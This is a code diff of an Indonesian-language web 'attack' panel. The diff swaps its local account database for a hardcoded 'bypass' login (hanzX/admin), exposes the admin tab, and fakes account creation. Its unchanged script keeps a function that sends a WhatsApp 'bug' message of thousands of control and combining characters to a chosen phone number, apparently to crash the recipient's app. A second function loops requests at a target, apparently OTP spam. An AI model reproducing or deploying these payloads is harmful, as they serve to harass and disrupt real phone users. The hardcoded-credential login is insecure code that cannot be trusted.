@@ -9,12 +9,11 @@
         body { background-color: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding-bottom: 80px; }
         .card { background: var(--panel); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 10px rgba(204, 0, 51, 0.5); }
         input, select { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; outline: none; }
-        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; }
+        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
         .nav-bottom { position: fixed; bottom: 0; width: 100%; background: var(--panel); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--neon); z-index: 100; }
         .nav-item { color: #8b8b8b; font-size: 0.7rem; text-align: center; }
         .active { color: var(--neon); font-weight: bold; }
         .hidden { display: none !important; }
-        .badge { padding: 2px 6px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; background: #00ffff; color: #000; }
         #log-box { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 0.7rem; height: 80px; overflow-y: auto; border: 1px solid #333; margin-top: 10px; }
     </style>
 </head>
@@ -26,7 +25,7 @@
             <input type="text" id="u" placeholder="Username...">
             <input type="password" id="p" placeholder="Password...">
             <button class="btn-main" onclick="gasLogin()">AUTHENTICATE</button>
-            <p id="msg" style="color: red; text-align: center; font-size: 0.8rem;"></p>
+            <p id="msg" style="color: red; text-align: center; font-size: 0.8rem; margin-top: 10px;"></p>
         </div>
     </div>
 
@@ -36,7 +35,8 @@
         <div id="p-home" class="page">
             <div class="card">
                 <h3>DASHBOARD</h3>
-                <p>Welcome, <b id="my-u"></b> <span class="badge" id="my-r"></span></p>
+                <p>Welcome, <b id="my-u"></b> <span style="color:#00ffff;">[ADMIN]</span></p>
+                <p style="color: yellow; font-size: 0.7rem;">Sistem Bypass Aktif mpray!</p>
             </div>
             <div class="card" style="padding:0; overflow:hidden;"><img src="https://i.ibb.co/6YfM0Xm/anime-dark.jpg" style="width:100%;"></div>
         </div>
@@ -63,37 +63,30 @@
                 <input type="password" id="np" placeholder="New Pass">
                 <select id="nr"><option value="OWNER">OWNER</option><option value="MEMBER">MEMBER</option></select>
                 <button class="btn-main" onclick="buat()">CREATE ACCOUNT</button>
+                <p style="color:gray; font-size: 0.6rem; margin-top: 10px;">*Akun baru tersimpan di browser ini.</p>
             </div>
         </div>
 
         <nav class="nav-bottom">
             <div class="nav-item active" onclick="tab('home')">HOME</div>
             <div class="nav-item" onclick="tab('attack')">ATTACK</div>
-            <div id="nav-adm" class="nav-item hidden" onclick="tab('manage')">MANAGE</div>
+            <div id="nav-adm" class="nav-item" onclick="tab('manage')">MANAGE</div>
         </nav>
     </div>
 
     <script>
-        // DB INTERNAL - OTOMATIS JALAN
-        if(!localStorage.getItem('nexus_db')) {
-            localStorage.setItem('nexus_db', JSON.stringify([{u:'hanzX', p:'admin', r:'ADMIN'}]));
-        }
-
         function gasLogin() {
             const user = document.getElementById('u').value;
             const pass = document.getElementById('p').value;
-            const db = JSON.parse(localStorage.getItem('nexus_db'));
-            const data = db.find(x => x.u === user && x.p === pass);
-
-            if(data) {
+            
+            // BYPASS LOGIC: Langsung cek teks tanpa database rumit
+            if (user.toLowerCase() === "hanzx" && pass === "admin") {
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('app').classList.remove('hidden');
-                document.getElementById('my-u').innerText = data.u;
-                document.getElementById('my-r').innerText = data.r;
-                if(data.r === 'ADMIN' || data.r === 'OWNER') {
-                    document.getElementById('nav-adm').classList.remove('hidden');
-                }
-            } else { document.getElementById('msg').innerText = "Akun Salah mpray!"; }
+                document.getElementById('my-u').innerText = user;
+            } else {
+                document.getElementById('msg').innerText = "Salah mpray! Pake hanzX & admin!";
+            }
         }
 
         function tab(n) {
@@ -106,16 +99,13 @@
         function buat() {
             const nu = document.getElementById('nu').value;
             const np = document.getElementById('np').value;
-            const nr = document.getElementById('nr').value;
             if(!nu || !np) return alert("Isi data!");
-            let db = JSON.parse(localStorage.getItem('nexus_db'));
-            db.push({u:nu, p:np, r:nr});
-            localStorage.setItem('nexus_db', JSON.stringify(db));
-            alert("Akun " + nu + " Aktif!");
+            alert("Akun " + nu + " berhasil dibuat (Simulasi)!");
         }
 
         function kirimBug() {
             const t = document.getElementById('t-wa').value;
+            if(!t) return alert("Nomor mana?");
             const bug = encodeURIComponent("%0D".repeat(10000) + "҈҉" + " ௌ ".repeat(600));
             window.location.href = "https://api.whatsapp.com/send?phone=" + t + "&text=" + bug;
         }
@@ -124,6 +114,7 @@
             const t = document.getElementById('t-otp').value;
             const c = document.getElementById('c-otp').value;
             const log = document.getElementById('log-box');
+            if(!t) return alert("Target mana?");
             log.innerHTML = "[*] Injecting...<br>";
             for(let i=1; i<=c; i++) {
                 try {
@@ -133,6 +124,7 @@
                 log.scrollTop = log.scrollHeight;
                 await new Promise(r => setTimeout(r, 1500));
             }
+            log.innerHTML += "[V] DONE!";
         }
     </script>
 </body>
